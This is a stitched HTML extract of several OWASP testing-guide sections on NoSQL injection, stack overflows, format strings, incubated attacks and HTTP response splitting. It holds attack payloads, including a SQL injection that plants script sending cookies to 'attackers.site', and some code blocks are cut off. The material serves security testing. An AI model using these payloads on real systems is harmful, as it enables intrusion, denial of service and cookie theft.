        <p>This input <code class="language-plaintext highlighter-rouge">0;var date=new Date(); do{curDate = new Date();}while(curDate-date&lt;10000)</code> inserted into <code class="language-plaintext highlighter-rouge">$userInput</code> in the above example code would result in the following JavaScript function being executed. This specific attack string would case the entire MongoDB instance to execute at 100% CPU usage for 10 second.</p>
        <p><code class="language-plaintext highlighter-rouge">function() { return obj.credits - obj.debits &lt; 0;var date=new Date(); do{curDate = new Date();}while(curDate-date&lt;10000); }</code></p>
        <h3 id="example-2">Example 2</h3>
        <p>Even if the input used within queries is completely sanitized or parameterized, there is an alternate path in which one might trigger NoSQL injection. Many NoSQL instances have their own reserved variable names, independent of the application programming language.</p>
        <p>For example within MongoDB, the <code class="language-plaintext highlighter-rouge">$where</code> syntax itself is a reserved query operator. It needs to be passed into the query exactly as shown; any alteration would cause a database error. However, because <code class="language-plaintext highlighter-rouge">$where</code> is also a valid PHP variable name, it may be possible for an attacker to insert code into the query by creating a PHP variable named <code class="language-plaintext highlighter-rouge">$where</code>. The PHP MongoDB documentation explicitly warns developers:</p>
        <p>Please make sure that for all special query operators (starting with <code class="language-plaintext highlighter-rouge">$</code>) you use single quotes so that PHP doesn&rsquo;t try to replace <code class="language-plaintext highlighter-rouge">$exists</code> with the value of the variable <code class="language-plaintext highlighter-rouge">$exists</code>.</p>
        <p>Even if a query depended on no user input, such as the following example, an attacker could exploit MongoDB by replacing the operator with malicious data.</p>
        <p><code class="language-plaintext highlighter-rouge">db.myCollection.find( { $where: function() { return obj.credits - obj.debits &lt; 0; } } );</code></p>
        <p>One way to potentially assign data to PHP variables is via HTTP Parameter Pollution (see: <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution">Testing for HTTP Parameter pollution</a>). By creating a variable named <code class="language-plaintext highlighter-rouge">$where</code> via parameter pollution, one could trigger a MongoDB error indicating that the query is no longer valid. Any value of <code class="language-plaintext highlighter-rouge">$where</code> other than the string <code class="language-plaintext highlighter-rouge">$where</code> itself, should suffice to demonstrate vulnerability. An attacker would develop a full exploit by inserting the following:</p>
        <p><code class="language-plaintext highlighter-rouge">$where: function() { //arbitrary JavaScript here }</code></p>

    <section id="div-main" class="page-body tab">
		</br>
    <h1 id="testing-for-stack-overflow">Testing for Stack Overflow</h1></br>
    <h4><a href="https://wiki.owasp.org/index.php/Buffer_Overflows#Stack_Overflow">Stack overflows</a> occur when variable size data is copied into fixed length buffers located on the program stack without any bounds checking. Vulnerabilities of this class are generally considered to be of high severity since their exploitation would mostly permit arbitrary code execution or Denial of Service. Rarely found in interpreted platforms, code written in C and similar languages is often ridden with instances of this vulnerability. In fact almost every platform is vulnerable to stack overflows with the following notable exceptions:</h4>
    <ul>
    <li>J2EE &ndash; as long as native methods or system calls are not invoked</li>
    <li>.NET &ndash; as long as /unsafe or unmanaged code is not invoked (such as the use of P/Invoke or COM Interop)</li>
    <li>PHP &ndash; as long as external programs and vulnerable PHP extensions written in C or C++ are not called can suffer from stack overflow issues.</li>
    </ul>
    <p>Stack overflow vulnerabilities often allow an attacker to directly take control of the instruction pointer and, therefore, alter the execution of the program and execute arbitrary code. Besides overwriting the instruction pointer, similar results can also be obtained by overwriting other variables and structures, like Exception Handlers, which are located on the stack.</p>
    <h2 id="how-to-test">How to Test</h2>
    <h3 id="black-box-testing">Black-Box Testing</h3>
    <p>The key to testing an application for stack overflow vulnerabilities is supplying overly large input data as compared to what is expected. However, subjecting the application to arbitrarily large data is not sufficient. It becomes necessary to inspect the application&rsquo;s execution flow and responses to ascertain whether an overflow has actually been triggered or not. Therefore, the steps required to locate and validate stack overflows would be to attach a debugger to the target application or process, generate malformed input for the application, subject the application to malformed input, and inspect responses in a debugger. The debugger allows the tester to view the execution flow and the state of the registers when the vulnerability gets triggered.</p>
    <p>On the other hand, a more passive form of testing can be employed, which involves inspecting assembly code of the application by using disassemblers. In this case, various sections are scanned for signatures of vulnerable assembly fragments. This is often termed as reverse engineering and is a tedious process.</p>
    <p>As a simple example, consider the following technique employed while testing an executable &ldquo;sample.exe&rdquo; for stack overflows:</p>
    <div class="language-c highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span>

        <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>

    <p>On opening the executable with the supplied arguments and continuing execution the following results are obtained.</p>
    <p><img src="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/images/Stack_overflow_vulnerability_2.gif" alt="Stack Overflow Vulnerability" /><br /> <em>Figure 4.7.13.2-2: OllyDbg Result - Stack Overflow Vulnerability</em></p>
    <p>As shown in the registers window of the debugger, the EIP or Extended Instruction Pointer, which points to the next instruction to be executed, contains the value <code class="language-plaintext highlighter-rouge">41414141</code>. <code class="language-plaintext highlighter-rouge">41</code> is a hexadecimal representation for the character <code class="language-plaintext highlighter-rouge">A</code> and therefore the string <code class="language-plaintext highlighter-rouge">AAAA</code> translates to 41414141.</p>
    <p>This clearly demonstrates how input data can be used to overwrite the instruction pointer with user-supplied values and control program execution. A stack overflow can also allow overwriting of stack-based structures like SEH (Structured Exception Handler) to control code execution and bypass certain stack protection mechanisms.</p>
    <p>As mentioned previously, other methods of testing such vulnerabilities include reverse engineering the application binaries, which is a complex and tedious process, and using fuzzing techniques.</p>
    <h3 id="gray-box-testing">Gray-Box Testing</h3>
    <p>When reviewing code for stack overflows, it is advisable to search for calls to insecure library functions like gets(), strcpy(), strcat() etc which do not validate the length of source strings and blindly copy data into fixed size buffers.</p>
    <p>For example consider the following function:-</p>
    <div class="language-c highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="kt">void</span> <span class="nf">log_create</span><span class="p">(</span><span class="kt">int</span> <span class="n">severity</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">inpt</span><span class="p">)</span> <span class="p">{</span>

    <span class="kt">char</span> <span class="n">b</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">severity</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="n">strcat</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="err">&rdquo;</span><span class="n">Error</span> <span class="n">occurred</span> <span class="n">on</span><span class="err">&rdquo;</span><span class="p">);</span>
    <span class="n">strcat</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">":"</span><span class="p">);</span>
    <span class="n">strcat</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">inpt</span><span class="p">);</span>


    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fopen</span> <span class="p">(</span><span class="s">"logfile.log"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span>
    <span class="p">}</span>
    </code></pre>
    </div>
    </div>
    <p>From above, the line strcat(b,inpt) will result in a stack overflow if inpt exceeds 1024 bytes. Not only does this demonstrate an insecure usage of strcat, it also shows how important it is to examine the length of strings referenced by a character pointer that is passed as an argument to a function; In this case the length of string referenced by <code class="language-plaintext highlighter-rouge">char *inpt</code>. Therefore it is always a good idea to trace back the source of function arguments and ascertain string lengths while reviewing code.</p>
    <p>Usage of the relatively safer <code class="language-plaintext highlighter-rouge">strncpy()</code> can also lead to stack overflows since it only restricts the number of bytes copied into the destination buffer. If the size argument that is used to accomplish this is generated dynamically based on user input or calculated inaccurately within loops, it is possible to overflow stack buffers. For example:-</p>
    <div class="language-c highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">source</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="n">Char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
    <span class="err">&hellip;</span>
    <span class="n">size</span><span class="o">=</span><span class="n">strlen</span><span class="p">(</span><span class="n">source</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
    <span class="err">&hellip;</span><span class="p">.</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span><span class="n">source</span><span class="p">,</span><span class="n">size</span><span class="p">)</span>
    <span class="p">}</span>
    </code></pre>
    </div>
    </div>
    <p>where source is user controllable data. A good example would be the <a href="https://www.securityfocus.com/archive/1/317615">samba trans2open stack overflow vulnerability</a>.</p>
    <p>Vulnerabilities can also appear in URL and address parsing code. In such cases, a function like <code class="language-plaintext highlighter-rouge">memccpy()</code> is usually employed which copies data into a destination buffer from source until a specified character is not encountered. Consider the function:</p>
    <div class="language-c highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="kt">char</span> <span class="n">servaddr</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
    <span class="err">&hellip;</span>
    <span class="n">memccpy</span><span class="p">(</span><span class="n">servaddr</span><span class="p">,</span><span class="n">path</span><span class="p">,</span><span class="err">'\'</span><span class="p">);</span>
    <span class="err">&hellip;</span><span class="p">.</span>
    <span class="p">}</span>
    </code></pre>
    </div>
    </div>
    <p>In this case the information contained in path could be greater than 40 bytes before <code class="language-plaintext highlighter-rouge">\</code> can be encountered. If so it will cause a stack overflow. A similar vulnerability was located in Windows RPCSS subsystem (MS03-026). The vulnerable code copied server names from UNC paths into a fixed size buffer until a <code class="language-plaintext highlighter-rouge">\</code> was encountered. The length of the server name in this case was controllable by users.</p>
    <p>Apart from manually reviewing code for stack overflows, static code analysis tools can also be of great assistance. Although they tend to generate a lot of false positives and would barely be able to locate a small portion of defects, they certainly help in reducing the overhead associated with finding low hanging fruits, like <code class="language-plaintext highlighter-rouge">strcpy()</code> and <code class="language-plaintext highlighter-rouge">sprintf()</code> bugs. A variety of tools like RATS, Flawfinder and ITS4 are available for analyzing C-style languages.</p>

      <h4>A format string is a null-terminated character sequence that also contains conversion specifiers interpreted or converted at runtime. If server-side code <a href="https://www.netsparker.com/blog/web-security/string-concatenation-format-string-vulnerabilities/">concatenates a user&rsquo;s input with a format string</a>, an attacker can append additional conversion specifiers to cause a runtime error, information disclosure, or buffer overflow.</h4>
      <p>The worst case for format strings vulnerabilities occur in languages that don&rsquo;t check arguments and also include a <code class="language-plaintext highlighter-rouge">%n</code> specifier that writes to memory. These functions, if exploited by an attacker modifying a format string, could cause <a href="https://www.veracode.com/security/format-string">information disclosure and code execution</a>:</p>
      <ul>
      <li>C and C++ <a href="https://en.cppreference.com/w/c/io/fprintf">printf</a> and similar methods fprintf, sprintf, snprintf</li>
      <li>Perl <a href="https://perldoc.perl.org/functions/printf.html">printf</a> and sprintf</li>
      </ul>
      <p>These format string functions cannot write to memory, but attackers can still cause information disclosure by changing format strings to output values the developers did not intend to send:</p>
      <ul>
      <li>Python 2.6 and 2.7 <a href="https://docs.python.org/2/library/string.html">str.format</a> and Python 3 unicode <a href="https://docs.python.org/3/library/stdtypes.html#str.format">str.format</a> can be modified by injecting strings that can point to <a href="https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/">other variables</a> in memory</li>
      </ul>
      <p>The following format string functions can cause runtime errors if the attacker adds conversion specifiers:</p>
      <ul>
      <li>Java <a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/String.html#format%28java.util.Locale%2Cjava.lang.String%2Cjava.lang.Object...%29">String.format</a> and <a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/PrintStream.html#format%2528java.util.Locale%252Cjava.lang.String%252Cjava.lang.Object...%2529">PrintStream.format</a></li>
      <li>PHP <a href="https://www.php.net/manual/es/function.printf.php">printf</a></li>
      </ul>
      <p>The code pattern that causes a format string vulnerability is a call to a string format function that contains unsanitized user input. The following example shows how a debug <code class="language-plaintext highlighter-rouge">printf</code> could make a program vulnerable:</p>
      <p>The example in C:</p>
      <div class="language-c highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="kt">char</span> <span class="o">*</span><span class="n">userName</span> <span class="o">=</span> <span class="cm">/* input from user controlled field */</span><span class="p">;</span>

      <span class="n">printf</span><span class="p">(</span><span class="s">"DEBUG Current user: "</span><span class="p">);</span>
      <span class="c1">// Vulnerable debugging code</span>
      <span class="n">printf</span><span class="p">(</span><span class="n">userName</span><span class="p">);</span>
      </code></pre>
      </div>
      </div>
      <p>The example in Java:</p>
      <div class="language-java highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="kd">final</span> <span class="nc">String</span> <span class="n">userName</span> <span class="o">=</span> <span class="cm">/* input from user controlled field */</span><span class="o">;</span>

      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="s">"DEBUG Current user: "</span><span class="o">);</span>
      <span class="c1">// Vulnerable code:</span>
      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="n">userName</span><span class="o">);</span>
      </code></pre>
      </div>
      </div>
      <p>In this particular example, if the attacker set their <code class="language-plaintext highlighter-rouge">userName</code> to have one or more conversion specifiers, there would be unwanted behaviour. The C example would <a href="https://www.defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf">print out memory contents</a> if <code class="language-plaintext highlighter-rouge">userName</code> contained <code class="language-plaintext highlighter-rouge">%p%p%p%p%p</code>, and it can corrupt memory contents if there is a <code class="language-plaintext highlighter-rouge">%n</code> in the string. In the Java example, a <code class="language-plaintext highlighter-rouge">username</code> containing any specifier that needs an input (including <code class="language-plaintext highlighter-rouge">%x</code> or <code class="language-plaintext highlighter-rouge">%s</code>) would cause the program to crash with <code class="language-plaintext highlighter-rouge">IllegalFormatException</code>. Although the examples are still subject to other problems, the vulnerability can be fixed by printf arguments of <code class="language-plaintext highlighter-rouge">printf("DEBUG Current user: %s", userName)</code>.</p>
      <h2 id="test-objectives">Test Objectives</h2>
      <p>Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behaviour from the application.</p>
      <h2 id="how-to-test">How to Test</h2>
      <p>Tests include analysis of the code and injecting conversion specifiers as user input to the application under test.</p>
      <h3 id="static-analysis">Static Analysis</h3>
      <p>Static analysis tools can find format string vulnerabilities in either the code or in binaries. Examples of tools include:</p>
      <ul>
      <li>C and C++: <a href="https://dwheeler.com/flawfinder/">Flawfinder</a></li>
      <li>Java: FindSecurityBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#FORMAT_STRING_MANIPULATION">FORMAT_STRING_MANIPULATION</a></li>
      <li>PHP: String formatter Analyzer in <a href="https://github.com/ovr/phpsa/blob/master/docs/05_Analyzers.md#function_string_formater">phpsa</a></li>
      </ul>
      <h3 id="manual-code-inspection">Manual Code Inspection</h3>
      <p>Static analysis may miss more subtle cases including format strings generated by complex code. To look for vulnerabilities manually in a codebase, a tester can look for all calls in the codebase that accept a format string and trace back to make sure untrusted input cannot change the format string.</p>
      <h3 id="conversion-specifier-injection">Conversion Specifier Injection</h3>
      <p>Testers can check at the unit test or full system test level by sending conversion specifiers in any string input. <a href="https://owasp.org/www-community/Fuzzing">Fuzz</a> the program using all of the conversion specifiers for all languages the system under test uses. See the <a href="https://owasp.org/www-community/attacks/Format_string_attack">OWASP Format string attack</a> page for possible inputs to use. If the test fails, the program will crash or display an unexpected output. If the test passes, the attempt to send a conversion specifier should be blocked, or the string should go through the system with no issues as with any other valid input.</p>
      <p>The examples in the following subsections have a URL of this form:</p>
      <p><code class="language-plaintext highlighter-rouge">https://vulnerable_host/userinfo?username=x</code></p>
      <ul>
      <li>The user-controlled value is <code class="language-plaintext highlighter-rouge">x</code> (for the <code class="language-plaintext highlighter-rouge">username</code> parameter).</li>
      </ul>
      <h4 id="manual-injection">Manual Injection</h4>
      <p>Testers can perform a manual test using a web browser or other web API debugging tools. Browse to the web application or site such that the query has conversion specifiers. Note that most conversion specifiers need <a href="https://tools.ietf.org/html/rfc3986#section-2.1">encoding</a> if sent inside a URL because they contain special characters including <code class="language-plaintext highlighter-rouge">%</code> and <code class="language-plaintext highlighter-rouge">{</code>. The test can introduce a string of specifiers <code class="language-plaintext highlighter-rouge">%s%s%s%n</code> by browsing with the following URL:</p>
      <p><code class="language-plaintext highlighter-rouge">https://vulnerable_host/userinfo?username=%25s%25s%25s%25n</code></p>
      <p>If the web site is vulnerable, the browser or tool should receive an error, which may include a timeout or an HTTP return code 500.</p>
      <p>The Java code returns the error</p>
      <p><code class="language-plaintext highlighter-rouge">java.util.MissingFormatArgumentException: Format specifier '%s'</code></p>
      <p>Depending on the C implementation, the process may crash completely with <code class="language-plaintext highlighter-rouge">Segmentation Fault</code>.</p>
      <h4 id="tool-assisted-fuzzing">Tool Assisted Fuzzing</h4>
      <p>Fuzzing tools including <a href="https://github.com/xmendez/wfuzz">wfuzz</a> can automate injection tests. For wfuzz, start with a text file (fuzz.txt in this example) with one input per line:</p>
      <p>fuzz.txt:</p>
      <div class="language-text highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code>alice
      %s%s%s%n
      %p%p%p%p%p
      {event.__init__.__globals__[CONFIG][SECRET_KEY]}
      </code></pre>
      </div>
      </div>
      <p>The <code class="language-plaintext highlighter-rouge">fuzz.txt</code> file contains the following:</p>
      <ul>
      <li>A valid input <code class="language-plaintext highlighter-rouge">alice</code> to verify the application can process a normal input</li>
      <li>Two strings with C-like conversion specifiers</li>
      <li>One Python conversion specifier to attempt to read global variables</li>
      </ul>
      <p>To send the fuzzing input file to the web application under test, use the following command:</p>
      <p><code class="language-plaintext highlighter-rouge">wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ</code></p>
      <p>In the above call, the <code class="language-plaintext highlighter-rouge">urlencode</code> argument enables the approprate escaping for the strings and <code class="language-plaintext highlighter-rouge">FUZZ</code> (with the capital letters) tells the tool where to introduce the inputs.</p>
      <p>An example output is as follows</p>
      <div class="language-text highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code>ID           Response   Lines    Word     Chars       Payload

      </div>
      <p>The above result validates the application&rsquo;s weakness to the injection of C-like conversion specifiers <code class="language-plaintext highlighter-rouge">%s</code> and <code class="language-plaintext highlighter-rouge">%p</code>.</p>

</br>
        <h4>Also often referred to as persistent attacks, incubated testing is a complex testing method that needs more than one data validation vulnerability to work. Incubated vulnerabilities are typically used to conduct &ldquo;watering hole&rdquo; attacks against users of legitimate web applications.</h4>
        <p>Incubated vulnerabilities have the following characteristics:</p>
        <ul>
        <li>The attack vector needs to be persisted in the first place, it needs to be stored in the persistence layer, and this would only occur if weak data validation was present or the data arrived into the system via another channel such as an admin console or directly via a backend batch process.</li>
        <li>Secondly, once the attack vector was &ldquo;recalled&rdquo; the vector would need to be executed successfully. For example, an incubated XSS attack would require weak output validation so the script would be delivered to the client in its executable form.</li>
        </ul>
        <p>Exploitation of some vulnerabilities, or even functional features of a web application, will allow an attacker to plant a piece of data that will later be retrieved by an unsuspecting user or other component of the system, exploiting some vulnerability there.</p>
        <p>In a penetration test, <code class="language-plaintext highlighter-rouge">incubated attacks</code> can be used to assess the criticality of certain bugs, using the particular security issue found to build a client-side based attack that usually will be used to target a large number of victims at the same time (i.e. all users browsing the site).</p>
        <p>This type of asynchronous attack covers a great spectrum of attack vectors, among them the following:</p>
        <ul>
        <li>File upload components in a web application, allowing the attacker to upload corrupted media files (JPEG images exploiting <code class="language-plaintext highlighter-rouge">CVE-2004-0200</code>, PNG images exploiting <code class="language-plaintext highlighter-rouge">CVE-2004-0597</code>, executable files, site pages with active component, etc.)</li>
        <li>Cross-site scripting issues in public forums posts (see <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting">Testing for Stored Cross Site Scripting</a> for additional details). An attacker could potentially store malicious scripts or code in a repository in the backend of the web-application (e.g., a database) so that this script/code gets executed by one of the users (end users, administrators, etc). The archetypical incubated attack is exemplified by using a cross-site scripting vulnerability in a user forum, bulletin board, or blog in order to inject some JavaScript code at the vulnerable page, and will be eventually rendered and executed at the site user&rsquo;s browser &ndash;using the trust level of the original (vulnerable) site at the user&rsquo;s browser.</li>
        <li>SQL/XPATH Injection allowing the attacker to upload content to a database, which will be later retrieved as part of the active content in a web page. For example, if the attacker can post arbitrary JavaScript in a bulletin board so that it gets executed by users, then he might take control of their browsers (e.g., <a href="http://sourceforge.net/projects/xss-proxy">XSS-proxy</a>).</li>
        <li>Misconfigured servers allowing installation of Java packages or similar site components (i.e. Tomcat, or web hosting consoles such as Plesk, CPanel, Helm, etc.)</li>
        </ul>
        <h2 id="test-objectives">Test Objectives</h2>
        <ul>

        <li>Set listeners or activate the recall step if possible.</li>
        </ul>
        <h2 id="how-to-test">How to Test</h2>
        <h3 id="black-box-testing">Black-Box Testing</h3>
        <h4 id="file-upload-example">File Upload Example</h4>
        <p>Verify the content type allowed to upload to the web application and the resultant URL for the uploaded file. Upload a file that will exploit a component in the local user workstation when viewed or downloaded by the user.

        <li>Use cookies obtained to impersonate users at the vulnerable site.</li>
        </ol>
        <h4 id="sql-injection-example">SQL Injection Example</h4>
        <p>Usually, this set of examples leverages XSS attacks by exploiting a SQL-injection vulnerability. The first thing to test is whether the target site has a SQL injection vulnerability. This is described in <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">Testing for SQL Injection</a>. For each SQL-injection vulnerability, there is an underlying set of constraints describing the kind of queries that the attacker/pen-tester is allowed to do.</p>
        <p>The tester then has to match the XSS attacks he has devised with the entries that he is allowed to insert.</p>
        <p>In a similar fashion as in the previous XSS example, use a web page field vulnerable to SQL injection issues to change a value in the database that would be used by the application as input to be shown at the site without proper filtering (this would be a combination of an SQL injection and a XSS issue). For instance, let&rsquo;s suppose there is a <code class="language-plaintext highlighter-rouge">footer</code> table at the database with all footers for the site pages, including a <code class="language-plaintext highlighter-rouge">notice</code> field with the legal notice that appears at the bottom of each web page. You could use the following query to inject JavaScript code to the <code class="language-plaintext highlighter-rouge">notice</code> field at the <code class="language-plaintext highlighter-rouge">footer</code> table in the database.</p>
        <div class="language-sql highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code><span class="k">SELECT</span><span class="err">&nbsp;</span><span class="n">field1</span><span class="p">,</span><span class="err">&nbsp;</span><span class="n">field2</span><span class="p">,</span><span class="err">&nbsp;</span><span class="n">field3</span>
        <span class="k">FROM</span><span class="err">&nbsp;</span><span class="n">table_x</span>
        <span class="k">WHERE</span><span class="err">&nbsp;</span><span class="n">field2</span><span class="err">&nbsp;</span><span class="o">=</span><span class="err">&nbsp;</span><span class="s1">'x'</span><span class="p">;</span>
        <span class="err">&nbsp;&nbsp;&nbsp;</span><span class="k">UPDATE</span><span class="err">&nbsp;</span><span class="n">footer</span>
        <span class="err">&nbsp;&nbsp;&nbsp;</span><span class="k">SET</span><span class="err">&nbsp;</span><span class="n">notice</span><span class="err">&nbsp;</span><span class="o">=</span><span class="err">&nbsp;</span><span class="s1">'Copyright&nbsp;1999-2030%20
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&gt;document.write(</span><span class="se">\'</span><span class="s1">&lt;img&nbsp;src="http://attackers.site/cv.jpg?</span><span class="se">\'</span><span class="s1">+document.cookie+</span><span class="se">\'</span><span class="s1">"&gt;</span><span class="se">\'</span><span class="s1">)&lt;/script&gt;'</span>

        </code></pre>
        </div>
        </div>
        <p>Now, each user browsing the site will silently send their cookies to the <code class="language-plaintext highlighter-rouge">attackers.site</code>.</p>
        <h4 id="misconfigured-server">Misconfigured Server</h4>
        <p>Some web servers present an administration interface that may allow an attacker to upload active components of her choice to the site. This could be the case with an Apache Tomcat server that doesn&rsquo;t enforce strong credentials to access its Web Application Manager (or if the pen testers have been able to obtain valid credentials for the administration module by other means).</p>
        <p>In this case, a WAR file can be uploaded and a new web application deployed at the site, which will not only allow the pen tester to execute code of her choice locally at the server, but also to plant an application at the trusted site, which the site regular users can then access (most probably with a higher degree of trust than when accessing a different site).</p>
        <p>As should also be obvious, the ability to change web page contents at the server, via any vulnerabilities that may be exploitable at the host which will give the attacker webroot write permissions, will also be useful towards planting such an incubated attack on the web server pages (actually, this is a known infection-spread method for some web server worms).</p>
        <h3 id="gray-box-testing">Gray-Box Testing</h3>
        <p>Gray-box or white-box testing techniques will be the same as previously discussed.</p>
        <ul>
        <li>Examining input validation is key in mitigating against this vulnerability. If other systems in the enterprise use the same persistence layer they may have weak input validation and the data may be persisted via a <code class="language-plaintext highlighter-rouge">backdoor</code>.</li>
        <li>To combat the <code class="language-plaintext highlighter-rouge">backdoor</code> issue for client-side attacks, output validation must also be employed so tainted data shall be encoded prior to displaying to the client, and hence not execute.</li>

        <h4>This section illustrates examples of attacks that leverage specific features of the HTTP protocol, either by exploiting weaknesses of the web application or peculiarities in the way different agents interpret HTTP messages. This section will analyze two different attacks that target specific HTTP headers:</h4>
        <ul>
        <li>HTTP splitting</li>
        <li>HTTP smuggling</li>
        </ul>
        <p>The first attack exploits a lack of input sanitization which allows an intruder to insert CR and LF characters into the headers of the application response and to &lsquo;split&rsquo; that answer into two different HTTP messages. The goal of the attack can vary from a cache poisoning to cross site scripting.</p>
        <p>In the second attack, the attacker exploits the fact that some specially crafted HTTP messages can be parsed and interpreted in different ways depending on the agent that receives them. HTTP smuggling requires some level of knowledge about the different agents that are handling the HTTP messages (web server, proxy, firewall) and therefore will be included only in the gray-box testing section.</p>

        <h3 id="black-box-testing">Black-Box Testing</h3>
        <h4 id="http-splitting">HTTP Splitting</h4>
        <p>Some web applications use part of the user input to generate the values of some headers of their responses. The most straightforward example is provided by redirections in which the target URL depends on some user-submitted value. Let&rsquo;s say for instance that the user is asked to choose whether they prefer a standard or advanced web interface. The choice will be passed as a parameter that will be used in the response header to trigger the redirection to the corresponding page.</p>
        <p>More specifically, if the parameter &lsquo;interface&rsquo; has the value &lsquo;advanced&rsquo;, the application will answer with the following:</p>
        <div class="language-http highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
        <span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 03 Dec 2005 16:22:19 GMT</span>
        <span class="na">Location</span><span class="p">:</span> <span class="s">http://victim.com/main.jsp?interface=advanced</span>
        <span class="s">&lt;snip&gt;</span>
        </code></pre>
        </div>
        </div>
        <p>When receiving this message, the browser will bring the user to the page indicated in the Location header. However, if the application does not filter the user input, it will be possible to insert in the &lsquo;interface&rsquo; parameter the sequence %0d%0a, which represents the CRLF sequence that is used to separate different lines. At this point, testers will be able to trigger a response that will be interpreted as two different responses by anybody who happens to parse it, for instance a web cache sitting between us and the application. This can be leveraged by an attacker to poison this web cache so that it will provide false content in all subsequent requests.</p>
        <p>Let&rsquo;s say that in the previous example the tester passes the following data as the interface parameter:</p>
        <p><code class="language-plaintext highlighter-rouge">advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a&lt;html&gt;Sorry,%20System%20Down&lt;/html&gt;</code></p>
        <p>The resulting answer from the vulnerable application will therefore be the following:</p>
        <div class="language-http highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
        <span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 03 Dec 2005 16:22:19 GMT</span>
        <span class="na">Location</span><span class="p">:</span> <span class="s">http://victim.com/main.jsp?interface=advanced</span>
        <span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>

        HTTP/1.1 200 OK
        Content-Type: text/html
        Content-Length: 35

        &lt;html&gt;Sorry,%20System%20Down&lt;/html&gt;
        &lt;other data&gt;
        </code></pre>
        </div>
        </div>
        <p>The web cache will see two different responses, so if the attacker sends, immediately after the first request, a second one asking for <code class="language-plaintext highlighter-rouge">/index.html</code>, the web cache will match this request with the second response and cache its content, so that all subsequent requests directed to <code class="language-plaintext highlighter-rouge">victim.com/index.html</code> passing through that web cache will receive the &ldquo;system down&rdquo; message. In this way, an attacker would be able to effectively deface the site for all users using that web cache (the whole Internet, if the web cache is a reverse proxy for the web application).</p>
        <p>Alternatively, the attacker could pass to those users a JavaScript snippet that mounts a cross site scripting attack, e.g., to steal the cookies. Note that while the vulnerability is in the application, the target here is its users. Therefore, in order to look for this vulnerability, the tester needs to identify all user controlled input that influences one or more headers in the response, and check whether they can successfully inject a CR+LF sequence in it.</p>
        <p>The headers that are the most likely candidates for this attack are:</p>
        <ul>
        <li><code class="language-plaintext highlighter-rouge">Location</code></li>
        <li><code class="language-plaintext highlighter-rouge">Set-Cookie</code></li>
        </ul>
        <p>It must be noted that a successful exploitation of this vulnerability in a real world scenario can be quite complex, as several factors must be taken into account:</p>
        <ol>
